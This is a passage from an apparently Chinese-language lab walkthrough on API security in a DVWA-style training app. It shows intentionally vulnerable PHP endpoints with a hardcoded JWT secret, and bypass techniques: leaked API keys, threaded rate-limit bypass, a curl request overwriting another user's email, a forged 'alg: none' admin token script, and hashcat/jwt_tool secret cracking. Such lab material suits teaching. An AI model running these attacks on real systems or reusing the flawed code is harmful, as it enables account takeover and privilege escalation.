=&gt; <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Endpoint not found&#x27;</span></span><br><span class="line">    ]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="新增防护"><a href="#新增防护" class="headerlink" title="新增防护"></a>新增防护</h3><ol>
<li><strong>API密钥认证</strong> - 需要密钥才能访问</li>
<li><strong>限流机制</strong> - 防止DoS攻击</li>
<li><strong>PDO预编译</strong> - 防止SQL注入</li>
<li><strong>字段白名单</strong> - 限制可修改字段</li>
<li><strong>不返回密码</strong> - 敏感信息保护</li>
</ol>
<h3 id="仍存在的漏洞"><a href="#仍存在的漏洞" class="headerlink" title="仍存在的漏洞"></a>仍存在的漏洞</h3><p><strong>核心问题：</strong></p>
<ol>
<li><strong>硬编码API密钥</strong> - 所有用户共享</li>
<li><strong>无授权检查</strong> - 有密钥就能操作所有数据</li>
<li><strong>限流实现弱</strong> - 文件锁不安全</li>
<li><strong>无用户上下文</strong> - 不知道谁在操作</li>
</ol>
<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><h4 id="方法1：获取API密钥"><a href="#方法1：获取API密钥" class="headerlink" title="方法1：获取API密钥"></a>方法1：获取API密钥</h4><p><strong>从客户端代码获取：</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果前端代码中硬编码了API密钥</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">API_KEY</span> = <span class="string">&#x27;dvwa_api_key_12345&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/api/users/1&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;X-API-Key&#x27;</span>: <span class="variable constant_">API_KEY</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看浏览器开发者工具 → Network → Headers</span></span><br><span class="line"><span class="comment">// 可以看到X-API-Key</span></span><br></pre></td></tr></table></figure>

<p><strong>从文档获取：</strong></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果API文档公开</span></span><br><span class="line">curl -X GET http:<span class="regexp">//</span>dvwa.local<span class="regexp">/api/u</span>sers/<span class="number">1</span> \</span><br><span class="line">     -H <span class="string">&quot;X-API-Key: dvwa_api_key_12345&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="方法2：绕过限流"><a href="#方法2：绕过限流" class="headerlink" title="方法2：绕过限流"></a>方法2：绕过限流</h4><p><strong>使用多个API密钥（如果有）：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">api_keys = [<span class="string">&#x27;key1&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>, <span class="string">&#x27;key3&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    key = api_keys[i % <span class="built_in">len</span>(api_keys)]</span><br><span class="line">    requests.get(url, headers=&#123;<span class="string">&#x27;X-API-Key&#x27;</span>: key&#125;)</span><br></pre></td></tr></table></figure>

<p><strong>竞态条件：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 同时发送多个请求</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_request</span>():</span><br><span class="line">    requests.get(url, headers=&#123;<span class="string">&#x27;X-API-Key&#x27;</span>: api_key&#125;)</span><br><span class="line"></span><br><span class="line">threads = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">    t = threading.Thread(target=make_request)</span><br><span class="line">    t.start()</span><br><span class="line">    threads.append(t)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">    t.join()</span><br></pre></td></tr></table></figure>

<h4 id="方法3：越权访问"><a href="#方法3：越权访问" class="headerlink" title="方法3：越权访问"></a>方法3：越权访问</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改其他用户数据（有密钥即可）</span></span><br><span class="line">curl -X PUT http://dvwa.local/api/users/1 \</span><br><span class="line">     -H <span class="string">&quot;X-API-Key: dvwa_api_key_12345&quot;</span> \</span><br><span class="line">     -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">     -d <span class="string">&#x27;&#123;&quot;email&quot;: &quot;hacked@evil.com&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果：成功修改admin的邮箱</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="High-难度"><a href="#High-难度" class="headerlink" title="High 难度"></a>High 难度</h2><h3 id="攻击目标-2"><a href="#攻击目标-2" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>使用JWT Token和更严格的权限检查，但仍有绕过可能。</p>
<h3 id="后端代码分析-2"><a href="#后端代码分析-2" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: application/json&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 新增：JWT Token认证 ★★★</span></span><br><span class="line"><span class="comment">// 从Authorization头获取Token</span></span><br><span class="line"><span class="comment">// Bearer token格式</span></span><br><span class="line"><span class="variable">$authHeader</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_AUTHORIZATION&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/Bearer\s+(.*)$/i&#x27;</span>, <span class="variable">$authHeader</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">401</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">        <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Missing or invalid authorization header&#x27;</span></span><br><span class="line">    ]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$token</span> = <span class="variable">$matches</span>[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ JWT验证 ★★★</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">verify_jwt</span>(<span class="params"><span class="variable">$token</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// JWT格式：header.payload.signature</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$parts</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$token</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$parts</span>) !== <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$header_b64</span>, <span class="variable">$payload_b64</span>, <span class="variable">$signature_b64</span>) = <span class="variable">$parts</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 问题：密钥硬编码 ★★★</span></span><br><span class="line">    <span class="variable">$secret</span> = <span class="string">&#x27;my_jwt_secret_key&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 验证签名</span></span><br><span class="line">    <span class="variable">$signature_check</span> = <span class="title function_ invoke__">hash_hmac</span>(</span><br><span class="line">        <span class="string">&#x27;sha256&#x27;</span>,</span><br><span class="line">        <span class="variable">$header_b64</span> . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$payload_b64</span>,</span><br><span class="line">        <span class="variable">$secret</span>,</span><br><span class="line">        <span class="literal">true</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="variable">$signature_check_b64</span> = <span class="title function_ invoke__">rtrim</span>(<span class="title function_ invoke__">strtr</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$signature_check</span>), <span class="string">&#x27;+/&#x27;</span>, <span class="string">&#x27;-_&#x27;</span>), <span class="string">&#x27;=&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$signature_check_b64</span> !== <span class="variable">$signature_b64</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解码payload</span></span><br><span class="line">    <span class="variable">$payload</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">strtr</span>(<span class="variable">$payload_b64</span>, <span class="string">&#x27;-_&#x27;</span>, <span class="string">&#x27;+/&#x27;</span>)), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 改进：检查过期时间 ★★★</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$payload</span>[<span class="string">&#x27;exp&#x27;</span>]) &amp;&amp; <span class="variable">$payload</span>[<span class="string">&#x27;exp&#x27;</span>] &lt; <span class="title function_ invoke__">time</span>()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// Token已过期</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$payload</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">verify_jwt</span>(<span class="variable">$token</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$payload</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">401</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">        <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Invalid or expired token&#x27;</span></span><br><span class="line">    ]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从payload获取用户信息</span></span><br><span class="line"><span class="variable">$currentUserId</span> = <span class="variable">$payload</span>[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line"><span class="variable">$currentUserRole</span> = <span class="variable">$payload</span>[<span class="string">&#x27;role&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$method</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>];</span><br><span class="line"><span class="variable">$path</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// GET /api/users/&#123;id&#125;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$method</span> == <span class="string">&#x27;GET&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\/users\/(\d+)$/&#x27;</span>, <span class="variable">$path</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$userId</span> = <span class="variable">$matches</span>[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 改进：权限检查 ★★★</span></span><br><span class="line">    <span class="comment">// 普通用户只能查看自己</span></span><br><span class="line">    <span class="comment">// 管理员可以查看所有用户</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$currentUserRole</span> !== <span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$currentUserId</span> != <span class="variable">$userId</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">http_response_code</span>(<span class="number">403</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Forbidden: You can only view your own data&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查询用户</span></span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT user_id, user, first_name, last_name, email, role FROM users WHERE user_id = :id&#x27;</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&#x27;:id&#x27;</span>, <span class="variable">$userId</span>, PDO::<span class="variable constant_">PARAM_INT</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$user</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span> =&gt; <span class="variable">$user</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;User not found&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// PUT /api/users/&#123;id&#125;</span></span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="variable">$method</span> == <span class="string">&#x27;PUT&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\/users\/(\d+)$/&#x27;</span>, <span class="variable">$path</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$userId</span> = <span class="variable">$matches</span>[<span class="number">1</span>];</span><br><span class="line">    <span class="variable">$input</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 权限检查 ★★★</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$currentUserRole</span> !== <span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$currentUserId</span> != <span class="variable">$userId</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">http_response_code</span>(<span class="number">403</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Forbidden: You can only update your own data&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 字段白名单（根据角色） ★★★</span></span><br><span class="line">    <span class="variable">$allowedFields</span> = [<span class="string">&#x27;first_name&#x27;</span>, <span class="string">&#x27;last_name&#x27;</span>, <span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 问题：管理员可以修改role ★★★</span></span><br><span class="line">    <span class="comment">// 但没有检查是否在修改自己的role</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$currentUserRole</span> === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable">$allowedFields</span>[] = <span class="string">&#x27;role&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$updates</span> = [];</span><br><span class="line">    <span class="variable">$params</span> = [<span class="string">&#x27;:id&#x27;</span> =&gt; <span class="variable">$userId</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$key</span>, <span class="variable">$allowedFields</span>)) &#123;</span><br><span class="line">            <span class="variable">$updates</span>[] = <span class="string">&quot;<span class="subst">$key</span> = :<span class="subst">$key</span>&quot;</span>;</span><br><span class="line">            <span class="variable">$params</span>[<span class="string">&quot;:<span class="subst">$key</span>&quot;</span>] = <span class="variable">$value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$updates</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;No valid fields to update&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;UPDATE users SET &quot;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;, &#x27;</span>, <span class="variable">$updates</span>) . <span class="string">&quot; WHERE user_id = :id&quot;</span>;</span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$params</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;User updated&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Failed to update user&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">404</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">        <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Endpoint not found&#x27;</span></span><br><span class="line">    ]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="新增防护-1"><a href="#新增防护-1" class="headerlink" title="新增防护"></a>新增防护</h3><ol>
<li><strong>JWT Token认证</strong> - 基于Token的认证</li>
<li><strong>Token过期</strong> - 限制Token有效期</li>
<li><strong>角色授权</strong> - 根据角色限制访问</li>
<li><strong>资源所有权</strong> - 只能访问自己的数据</li>
</ol>
<h3 id="仍存在的漏洞-1"><a href="#仍存在的漏洞-1" class="headerlink" title="仍存在的漏洞"></a>仍存在的漏洞</h3><p><strong>核心问题：</strong></p>
<ol>
<li><strong>JWT密钥硬编码</strong> - 可能被获取</li>
<li><strong>算法混淆攻击</strong> - none算法绕过</li>
<li><strong>权限检查逻辑漏洞</strong> - 管理员可以修改自己为超级管理员</li>
</ol>
<h3 id="绕过方法-1"><a href="#绕过方法-1" class="headerlink" title="绕过方法"></a>绕过方法</h3><h4 id="方法1：JWT算法混淆攻击"><a href="#方法1：JWT算法混淆攻击" class="headerlink" title="方法1：JWT算法混淆攻击"></a>方法1：JWT算法混淆攻击</h4><p><strong>None算法攻击：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建header（指定算法为none）</span></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;none&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建payload</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;user_id&quot;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&quot;role&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;exp&quot;</span>: <span class="number">9999999999</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Base64编码</span></span><br><span class="line">header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造Token（无签名）</span></span><br><span class="line">fake_token = <span class="string">f&quot;<span class="subst">&#123;header_b64&#125;</span>.<span class="subst">&#123;payload_b64&#125;</span>.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Fake token: <span class="subst">&#123;fake_token&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用这个Token访问API</span></span><br></pre></td></tr></table></figure>

<h4 id="方法2：暴力破解JWT密钥"><a href="#方法2：暴力破解JWT密钥" class="headerlink" title="方法2：暴力破解JWT密钥"></a>方法2：暴力破解JWT密钥</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用jwt_tool</span></span><br><span class="line">python3 jwt_tool.py &lt;JWT_TOKEN&gt; -C -d /usr/share/wordlists/rockyou.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或使用hashcat</span></span><br><span class="line">hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>

